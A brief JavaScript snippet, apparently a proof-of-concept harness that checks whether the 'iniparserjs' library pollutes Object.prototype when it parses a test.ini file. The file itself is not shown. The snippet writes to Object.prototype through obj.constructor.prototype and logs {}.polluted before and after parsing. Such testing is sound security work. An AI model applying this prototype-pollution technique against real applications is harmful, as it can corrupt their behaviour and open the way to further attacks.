var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
var path = require('path');
var IniParser = require('iniparserjs');
var config = new IniParser(path.join(__dirname, 'test.ini'), 'UTF8');
console.log({}.polluted);